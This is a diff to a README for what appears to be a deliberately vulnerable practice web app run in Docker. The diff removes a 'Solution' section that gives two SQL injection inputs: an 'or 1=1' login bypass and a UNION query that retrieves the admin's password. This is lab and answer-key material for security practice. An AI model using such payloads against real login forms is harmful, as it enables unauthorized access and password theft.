@@ -13,13 +13,3 @@ docker run -dp 80:5000 <docker image id>
 
 Visit [http://localhost](http://localhost)
 
-### Solution
-To bypass login,
-
-	username: admin' or 1=1-- -
-	password: 
-
-To perform union injection attack and retrieve admin's password:
-
-	 username: admin
-	 password: ' union select password from users -- -
